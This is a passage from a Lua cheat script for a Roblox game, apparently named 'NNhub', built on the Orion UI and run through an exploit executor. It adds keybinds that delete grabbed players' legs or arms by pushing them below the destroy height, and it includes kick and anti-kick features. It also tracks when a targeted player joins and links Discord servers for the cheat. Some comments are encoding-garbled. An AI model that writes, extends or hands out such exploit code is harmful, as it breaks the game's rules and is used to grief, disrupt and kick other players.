                blob:WaitForChild("VehicleSeat",1):Sit(hum)
                local end1 = tick() + 1
                while tick() < end1 and task.wait() do 
                    FWD(blob,"HumanoidCreature"):ChangeState(Enum.HumanoidStateType.Running)
                end
            end 
        end    
    })


    Toggles["DeleteLegsKeybind"] = KeybindTab:AddBind({
        Name = "Delete Legs",
        Default = Enum.KeyCode.Y,
        Hold = false,
        Save = true,
        Flag = "DeleteLegsKeybind",
        Callback = function()
            local GrabParts = game.workspace:FindFirstChild("GrabParts")
            if not GrabParts then return end 
            local GrabPart = GrabParts:WaitForChild("GrabPart",1):WaitForChild("WeldConstraint",1).Part1
            if not GrabPart then return end 
            local plrtar = GrabPart.Parent 
            local rl,ll,torso = plrtar:FindFirstChild("Right Leg"),plrtar:FindFirstChild("Left Leg"),plrtar:FindFirstChild("Torso") 
            if not rl or not ll or not torso then  
                return 
            end
            local oldFAL = workspace.FallenPartsDestroyHeight
            Workspace.FallenPartsDestroyHeight = -50000
            rl.CFrame = CFrame.new(0,-60000,0)
            ll.CFrame = CFrame.new(0,-60000,0)
            task.wait(0.1)
            torso.CFrame = CFrame.new(0,-55970,0)
            task.wait(0.1)
            workspace.FallenPartsDestroyHeight = oldFAL
        end    
    })


    Toggles["DeleteArmsKeybind"] = KeybindTab:AddBind({
        Name = "Delete Arms",
        Default = Enum.KeyCode.U,
        Hold = false,
        Save = true,
        Flag = "DeleteArmsKeybind",
        Callback = function()
            local GrabParts = game.workspace:FindFirstChild("GrabParts")
            if not GrabParts then return end 
            local GrabPart = GrabParts:WaitForChild("GrabPart",1):WaitForChild("WeldConstraint",1).Part1
            if not GrabPart then return end 
            local plrtar = GrabPart.Parent 
            local ra,la,torso = plrtar:FindFirstChild("Right Arm"),plrtar:FindFirstChild("Left Arm"),plrtar:FindFirstChild("Torso")
            if not ra or not la or not torso then 
                return
            end
            local oldFAL = workspace.FallenPartsDestroyHeight
            workspace.FallenPartsDestroyHeight = -50000
            ra.CFrame = CFrame.new(0,-60000,0)
            la.CFrame = CFrame.new(0,-60000,0)
            task.wait(0.1)
            torso.CFrame = CFrame.new(0,-55970,0)
            task.wait(0.1)
            workspace.FallenPartsDestroyHeight = oldFAL
        end    
    })
    
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

InfoTab:AddParagraph("INFORMATION", [[
<font color="#00FFFF"><b>[PLAYER]</b></font>
名前: ]]..LocalPlayer.Name..[[

<font color="#FFFF00"><b>[USER ID]</b></font>
ID: ]]..LocalPlayer.UserId..[[

<font color="#FF00FF"><b>[DISPLAY]</b></font>
表示名: ]]..LocalPlayer.DisplayName..[[

<font color="#00FF00"><b>[SERVER]</b></font>
Server ID: ]]..game.JobId..[[

<font color="#FF8000"><b>[PLACE]</b></font>
Map ID: ]]..game.PlaceId
)

InfoTab:AddLabel("Developer : donald")

InfoTab:AddLabel("UI Developer : !Leo")

InfoTab:AddLabel("最終アップデート日 : 31日")

InfoTab:AddButton({
    Name = "製作者鯖Discord Invite Copy",
    Callback = function()
        setclipboard("https://discord.gg/xxUNCyrNAP")

        OrionLib:MakeNotification({
            Name = "Copied!",
            Content = "Discord招待リンクをコピーしました。",
            Time = 3
        })
    end
})

InfoTab:AddButton({
    Name = "カピバラ鯖Discord Invite Copy",
    Callback = function()
        setclipboard("https://discord.gg/aY3y7XbSzC")

        OrionLib:MakeNotification({
            Name = "Copied!",
            Content = "Discord招待リンクをコピーしました。",
            Time = 3
        })
    end
})
    
    ConfigTab:AddSection({
        Name = "ESP COLORS(Restart the PCLD_ESP function)"
    })

    Toggles["PCLD_ESPCOLOR"] = ConfigTab:AddColorpicker({
        Name = "PCLD_ESP COLOR",
        Default = Color3.fromRGB(0, 255, 255),
        Save = true,
        Flag = "PCLD_ESPCOLOR",
        Callback = function(Value)
            int.PCLDColor = Value
        end	  
    })
    ConfigTab:AddSection({
        Name = "AntiKick(respawn the antikick)"
    })
    Toggles["MainAntiKickColor"] = ConfigTab:AddColorpicker({
        Name = "AntiKick MainPart Color",
        Default = Color3.fromRGB(255, 0, 255),
        Save = true,
        Flag = "MainAntiKickColor",
        Callback = function(Value)
            int.MainAntiKickColor = Value
        end	  
    })
    Toggles["PyramidAntiKickColor"] = ConfigTab:AddColorpicker({
        Name = "AntiKick Pyramids Color",
        Default = Color3.fromRGB(255, 210, 130),
        Save = true,
        Flag = "PyramidAntiKickColor",
        Callback = function(Value)
            int.PyramidAntiKickColor = Value
        end	  
    })
    ConfigTab:AddSection({
        Name = "Anchor(Re-Anchor to see)"
    })
    Toggles["AnchorColor"] = ConfigTab:AddColorpicker({
        Name = "Anchor outline color",
        Default = Color3.fromRGB(0, 0, 255),
        Save = true,
        Flag = "AnchorColor",
        Callback = function(Value)
            int.OutlineAnchorColor = Value
        end	  
    })
    Toggles["AnchorTransparency"] = ConfigTab:AddSlider({
        Name = "AnchorTransparency",
        Min = 0,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(255, 0, 255),
        Increment = 1,
        ValueName = "",
        Save = true,
        Flag = "AnchorTransparency",
        Callback = function(Value)
            int.AnchorTransp = Value * 0.01
        end    
    })

    
    ConfigTab:AddSection({
        Name = "GUI settings"
    })
        local GUI = FWD(game.CoreGui,"NNhubOrion") 
        local MainFrame 
        for _,v in pairs(GUI:GetChildren()) do 
            if v.Name == "Frame" and v.BackgroundTransparency ~= 1 then 
                MainFrame = v
            end
        end
    Toggles["GUIWIDE"] = ConfigTab:AddSlider({
        Name = "GUI SIZE X",
        Min = 400,
        Max = 5000,
        Default = 650,
        Color = Color3.fromRGB(0,0,255),
        Increment = 1,
        ValueName = "pix",
        Save = true,
        Flag = "GUISIZEX",
        Callback = function(Value)
            int.GUIWIDE = Value
        end    
    })
    Toggles["GUIHEIGHT"] = ConfigTab:AddSlider({
        Name = "GUI SIZE Y",
        Min = 200,
        Max = 5000,
        Default = 400,
        Color = Color3.fromRGB(255, 0, 0),
        Increment = 1,
        ValueName = "pix",
        Save = true,
        Flag = "GUISIZEY",
        Callback = function(Value)
            int.GUIHEIGHT = Value
        end    
    })
    ConfigTab:AddButton({
        Name = "Apply Size",
        Callback = function()
            MainFrame.Size = UDim2.new(0,int.GUIWIDE,0,int.GUIHEIGHT)
        end    
    })


    Toggles["GUITransparency"] = ConfigTab:AddSlider({
        Name = "GUI Transparency",
        Min = 0,
        Max = 100,
        Default = 30,
        Color = Color3.fromRGB(255, 0, 255),
        Increment = 1,
        ValueName = "",
        Save = true,
        Flag = "GUITransparency",
        Callback = function(Value)
            MainFrame.BackgroundTransparency = Value * 0.01
        end    
    })
        Toggles["GUICOLOR"] = ConfigTab:AddColorpicker({
            Name = "GUI Background Color",
            Default = Color3.fromRGB(25, 25, 25),
            Save = true,
            Flag = "GUICOLOR",
            Callback = function(Value)
                MainFrame.BackgroundColor3 = Value
            end	  
        })
    

    ConfigTab:AddSection({
        Name = "Config saver/loader"
    })

    ConfigTab:AddTextbox({
        Name = "FileName(Without .txt)",
        Default = "",
        TextDisappear = false,
        Callback = function(Value)
            etc.FileName = Value
        end	  
    })
    ConfigTab:AddButton({
        Name = "Save Config",
        Callback = function()
            if etc.FileName ~= nil then 
                OrionLib:SaveCfg1(etc.FileName)
            else 
                Notify("Error!","Expected smth in filename!")
            end
        end    
    })

    local function GetFiles() 
        local files = listfiles('NNhub')
        local metaball = {}
        for _,v in pairs(files) do 
            if v:find('.txt') then 
                table.insert(metaball,v)
            end
        end
        return metaball
    end

    local ConfigDropDown = ConfigTab:AddDropdown({
        Name = "List files",
        Default = "",
        Options = GetFiles(),
        Callback = function(Value)
            etc.FileToLoad = Value
    end})

    ConfigTab:AddButton({
        Name = "Load Config",
        Callback = function()
            if etc.FileToLoad ~= nil then 
                OrionLib:LoadCfg1(etc.FileToLoad)
            else 
                Notify("Error!","Expected file got nil????")
            end
        end    
    })

    local oldFiles = {}

    coroutine.wrap(function()
        while task.wait(1) do
            local newFiles = GetFiles()
            
            if #newFiles ~= #oldFiles then
                ConfigDropDown:Refresh(newFiles, true)
                oldFiles = newFiles
            end
        end
    end)()

    task.delay(2,function()
        local StartTick = tick()
        local Character,Root
        while task.wait(0.025) do
            if tick() - StartTick >= 0.1 then

                if CountOfLines >= 40 then
                    local LagPlr = game.Players:GetPlayerFromCharacter(LastLagSource)
                    if LagPlr and OrionLib and bool.AutoAntiLag then 
                        OrionLib:MakeNotification({
                            Name = "<font color=\"rgb(255, 0, 0)\"><b>AUTO-ANTILAG</b></font> NOTIFY",
                            Content = "<font color=\"rgb(100, 0, 100)\"><b>[LAG] </b></font>: "..LagPlr.Name.."(@"..LagPlr.DisplayName..")",
                            Image = "angry",
                            Time = 5
                        })
                        Toggles["AntiLag"]:Set(true)
                    end
                end
                StartTick = tick()
                CountOfLines = 0
                -- AntiMassless Everyone!!1!1
                for _,v in pairs(Players:GetPlayers()) do
                    if v ~= plr then
                        local char = v.Character
                        if char then
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if hrp and hrp.Massless then
                                local hum = hrp and char:FindFirstChild("Humanoid")
                                if (hum) and not(hum.Sit) then 
                                    hrp.Massless = false
                                end
                            end
                        end
                    end
                end
                -- Ð±Ð»Ð° Ð±Ð»Ð° ÐºÐ°Ð½ÐµÑ 
            end
        end
    end)

    int.LastKunaiSource = nil
    _G.TryAntiFling = false
    workspace.DescendantAdded:Connect(function(v)
        if v.Name == "NinjaKunai" or v.Name == "NinjaShuriken" then 
        local name = v.Parent.Name:gsub("SpawnedInToys$", "")
        local plr = game.Players:FindFirstChild(name)
            if plr and plr ~= game.Players.LocalPlayer and plr ~= int.LastKunaiSource then  
                int.LastKunaiSource = plr
                OrionLib:MakeNotification({
                    Name = "ANTIKICK NOTIFY",
                    Content = "[Script]: "..plr.Name.." ("..plr.DisplayName..")",
                    Image = "user-star",
                    Time = 5
                })
                task.delay(5, function()
                    int.LastKunaiSource = nil
                end)
            end
        elseif v.Name == "GrabBeam" then  
            CountOfLines += 1  
            LastLagSource = v.Parent.Parent.Parent
        elseif v.Name == "PaintPlayerPart" and bool.AntiPaint then  
            Debris:AddItem(v,0)
        elseif ((v.Name == "PalletLightBrown" or v.Name == "YouDecoy") and v.Parent ~= inv) and _G.TryAntiFling then  
            for _,v in pairs(v:GetDescendants()) do 
                v.CanCollide = false 
            end
        elseif (v.Name == "CreatureBlobman" and v.Parent ~= inv) and bool.AntiBlob then 
            task.spawn(function()
                if InOwnedPlot.Value then  
                    local Plot = CheckForHome()
                    if Plot and v.Parent == Plot then return end
                end
                local LeftDetector,RightDetector = FWD(v,"LeftDetector",5),FWD(v,"RightDetector",5)
                if LeftDetector then 
                    FWD(LeftDetector,"LeftWeld").Enabled = false 
                    FWD(LeftDetector,"LeftAlignOrientation").Enabled = false  
                    FWD(LeftDetector,"LeftAlignOrientation").RigidityEnabled = false
                end 
                if RightDetector then  
                    FWD(RightDetector,"RightWeld").Enabled = false 
                    FWD(RightDetector,"RightAlignOrientation").Enabled = false 
                    FWD(RightDetector,"RightAlignOrientation").RigidityEnabled = false
                end
            end)
        end
    end)

    for i, v in pairs(workspace.Map.TrainTunnel:GetDescendants()) do
        if v.ClassName == "Part" and v.CFrame == CFrame.new(556.441345, 134.338745, 37.904129, 0.980784655, 0, 0.195093334, 0, 1, 0, -0.195093334, 0, 0.980784655) then
            v:Destroy()
        end
    end

    OnCharAdded(plr.Character)
    local WasLagged = false
    local function GetSizeMB(StringLength)
        return StringLength / (1024 * 1024)
    end
    RS.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(arg1,data)
        if typeof(data) == "string" and not WasLagged then 
            WasLagged = true
            local StringLen = string.len(data)
            if StringLen > 300 then 
                int.RedeemPackets += 1
                Toggles["Redeemed"]:Set("ðð½ Redeemed packets:"..tostring(int.RedeemPackets))
                local SizeRounded = math.round(GetSizeMB(StringLen) * 1000) / 1000 
                OrionLib:MakeNotification({
                    Name = "<font color=\"rgb(255, 0, 0)\"><b>PACKET LAGS DETECTED</b></font>",
                    Content = "Source: "..tostring(arg1).."\nSize: "..tostring(SizeRounded).." MB",
                    Image = "rat",
                    Time = 5
                })
                task.delay(5, function()
                    WasLagged = false
                end)    
            end
        end
    end)
    game.Players.PlayerAdded:Connect(function(plr1)
        options, playerMap = BuildPlayerOptions()
        Dropdown1:Refresh(options,true)
        if plr1.Name == selectedPlrName then 
            OrionLib:MakeNotification({
                Name = "<font color=\"rgb(255, 6, 0)\"><b>TARGET</b></font>".." Joined",
                Content = "<font color=\"rgb(0, 255, 0)\"><b>[JOIN] </b></font>"..plr1.Name.." ("..plr1.DisplayName..")",
                Image = "user-plus",
                Time = 5
            })
        elseif IsFriend(plr1) then   
            OrionLib:MakeNotification({
                Name = "<font color=\"rgb(0, 255, 0)\"><b>FRIEND</b></font>".." Joined",
                Content = "<font color=\"rgb(0, 255, 0)\"><b>[JOIN] </b></font>"..plr1.Name.." ("..plr1.DisplayName..")",
                Image = "shield-user",
                Time = 5
            })
        end
    end)

    game.Players.PlayerRemoving:Connect(function(plr1)
        options, playerMap = BuildPlayerOptions()
        Dropdown1:Refresh(options,true)
        if CFP(workspace,"BlackHoleKick") then 
            workspace["BlackHoleKick"].Name = "UsedblackHole"
            OrionLib:MakeNotification({
                Name = "PLR ".."<font color=\"rgb(255, 93, 0)\"><b>KICK</b></font>",
                Content = "<font color=\"rgb(255, 93, 0)\"><b>[KICK] </b></font>"..plr1.Name.." ("..plr1.DisplayName..")",
                Image = "user-lock",
                Time = 5
            })
        else 
            OrionLib:MakeNotification({
            Name = "PLR ".."<font color=\"rgb(255, 217, 0)\"><b>LEFT</b></font>",
            Content = "<font color=\"rgb(255, 217, 0)\"><b>[LEFT] </b></font>"..plr1.Name.." ("..plr1.DisplayName..")",
            Image = "user-minus",
            Time = 5
        })
        end
    end)
    plr.CharacterAdded:Connect(OnCharAdded)

OrionLib:Init()
